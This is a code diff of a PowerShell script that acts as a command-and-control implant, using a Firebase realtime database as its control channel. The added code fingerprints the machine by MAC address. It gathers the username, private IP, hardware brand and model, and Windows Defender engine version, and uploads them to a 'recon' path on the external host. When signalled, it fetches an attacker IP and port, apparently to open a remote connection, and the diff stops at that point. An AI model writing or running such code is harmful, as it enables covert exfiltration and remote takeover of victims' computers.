@@ -1,12 +1,46 @@
-$client = "client_1"
-$url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/$client/state.json"
+$primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
+$url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/$($primaryAdapter.MacAddress)/state.json"
 
 while ($true) {
     $response = Invoke-RestMethod -Uri $url
     $state = $response
-    Write-Output $state
+    # Write-Output ("State type: " + $state.GetType().FullName)
 
-    if ($state -eq 1) {
+    if ($state -eq "null") {
+        # cUrl the data to the Firebase Realtime Database
+        $stateChild = @{
+            "state" = 0
+        } | ConvertTo-Json
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
+        # echo "State is null"
+
+        # Get the primary network adapter
+        $primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
+        # Get Device username
+        $deviceUsername = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName).Split('\')[1]
+        # Get Device private IP address
+        $deviceIP = (Get-NetIPAddress -InterfaceIndex $primaryAdapter.InterfaceIndex -AddressFamily IPv4).IPAddress
+        # Get Device Brand
+        $deviceBrand = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)
+        # Get Device Model
+        $deviceModel = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model)
+        # Get Device Windows Defender version
+        $defenderVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates" -Name "EngineVersion").EngineVersion
+
+        # cUrl the data to the Firebase Realtime Database
+        $recon = @{
+            "User" = $deviceUsername
+            "IP" = $deviceIP
+            "Brand" = $deviceBrand
+            "Model" = $deviceModel
+            "Defender" = $defenderVersion
+        } | ConvertTo-Json
+
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/recon.json') -Method PUT -Body $recon | Out-Null
+    }
+
+    elseif ($state -eq 1) {
         $ip = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json"
         $port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json"
 
